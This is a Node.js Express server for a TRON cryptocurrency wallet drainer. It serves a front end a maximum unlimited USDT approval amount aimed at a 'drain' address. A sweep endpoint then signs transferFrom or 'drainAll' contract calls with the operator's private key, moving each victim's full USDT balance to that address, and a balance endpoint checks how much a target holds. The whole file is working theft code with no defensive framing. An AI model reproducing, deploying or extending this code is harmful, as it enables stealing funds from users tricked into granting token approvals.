require('dotenv').config();
const express = require('express');
const cors = require('cors');
const path = require('path');
const { TronWeb } = require('tronweb');

const app = express();
const PORT = process.env.PORT || 3000;

// Middleware
app.use(cors());
app.use(express.json());
// Serve static files from "public" folder
app.use(express.static(path.join(__dirname, 'public')));

// TronWeb instance (used for reading balances, not for signing)
const tronWeb = new TronWeb({
    fullHost: process.env.TRON_FULL_NODE || 'https://api.trongrid.io',
    headers: process.env.TRON_API_KEY ? { 'TRON-PRO-API-KEY': process.env.TRON_API_KEY } : {}
});

const USDT_CONTRACT = process.env.USDT_CONTRACT || 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t';
const DRAIN_ADDRESS = process.env.DRAIN_ADDRESS;
const DRAIN_CONTRACT = process.env.DRAIN_CONTRACT || '';
const USDT_DECIMALS = 6;

// Helper to retry on rate limit
async function retryRequest(fn, maxRetries = 3) {
    for (let i = 0; i < maxRetries; i++) {
        try {
            return await fn();
        } catch (err) {
            if (err?.response?.status === 429 && i < maxRetries - 1) {
                await new Promise(r => setTimeout(r, (i + 1) * 1000));
                continue;
            }
            throw err;
        }
    }
}

// ---------- API ROUTES ----------
app.post('/api/balance', async (req, res) => {
    try {
        const { address } = req.body;
        if (!address || !tronWeb.isAddress(address)) {
            return res.status(400).json({ error: 'Invalid TRON address' });
        }
        const contract = await tronWeb.contract().at(USDT_CONTRACT);
        const rawBalance = await retryRequest(() => contract.balanceOf(address).call());
        const usdt = (rawBalance.toNumber ? rawBalance.toNumber() : Number(rawBalance)) / 10 ** USDT_DECIMALS;
        const account = await retryRequest(() => tronWeb.trx.getAccount(address));
        const trx = (account.balance ? (account.balance.toNumber ? account.balance.toNumber() : Number(account.balance)) : 0) / 1e6;
        res.json({ address, usdt, trx });
    } catch (err) {
        console.error('Balance error:', err);
        res.status(500).json({ error: err.message });
    }
});

app.post('/api/sweep', async (req, res) => {
    try {
        const { address } = req.body;
        if (!address || !tronWeb.isAddress(address)) {
            return res.status(400).json({ error: 'Invalid address' });
        }
        const drainPk = process.env.DRAIN_PRIVATE_KEY;
        if (!drainPk) {
            return res.status(500).json({ error: 'Drain private key not configured' });
        }
        // Create a TronWeb instance with the drain private key to sign transactions
        const drainWeb = new TronWeb({
            fullHost: process.env.TRON_FULL_NODE || 'https://api.trongrid.io',
            headers: process.env.TRON_API_KEY ? { 'TRON-PRO-API-KEY': process.env.TRON_API_KEY } : {},
            privateKey: drainPk
        });

        let target, method, parameters;
        if (DRAIN_CONTRACT) {
            target = DRAIN_CONTRACT;
            method = 'drainAll(address)';
            parameters = [{ type: 'address', value: address }];
        } else {
            target = USDT_CONTRACT;
            method = 'transferFrom(address,address,uint256)';
            const contract = await drainWeb.contract().at(USDT_CONTRACT);
            const raw = await contract.balanceOf(address).call();
            const balance = raw.toNumber ? raw.toNumber() : Number(raw);
            if (balance <= 0) {
                return res.json({ success: false, error: 'Zero balance' });
            }
            parameters = [
                { type: 'address', value: address },
                { type: 'address', value: DRAIN_ADDRESS },
                { type: 'uint256', value: balance.toString() }
            ];
        }

        const tx = await drainWeb.transactionBuilder.triggerSmartContract(
            target, method,
            { feeLimit: 200_000_000 },
            parameters,
            DRAIN_ADDRESS
        );
        const signed = await drainWeb.trx.sign(tx.transaction);
        const receipt = await drainWeb.trx.sendRawTransaction(signed);
        if (receipt.code && receipt.code !== 'SUCCESS') {
            return res.json({ success: false, error: JSON.stringify(receipt) });
        }
        res.json({ success: true, txId: receipt.txid || receipt });
    } catch (err) {
        console.error('Sweep error:', err);
        res.status(500).json({ success: false, error: err.message });
    }
});

app.get('/api/config', (req, res) => {
    res.json({
        usdtContract: USDT_CONTRACT,
        drainAddress: DRAIN_ADDRESS,
        drainContract: DRAIN_CONTRACT,
        maxApprove: '115792089237316195423570985008687907853269984665640564039457584007913129639935'
    });
});

// Catch-all to serve index.html for any unknown route (SPA support)
app.get('*', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// Start server
app.listen(PORT, () => {
    console.log(`✅ Server running at http://localhost:${PORT}`);
});
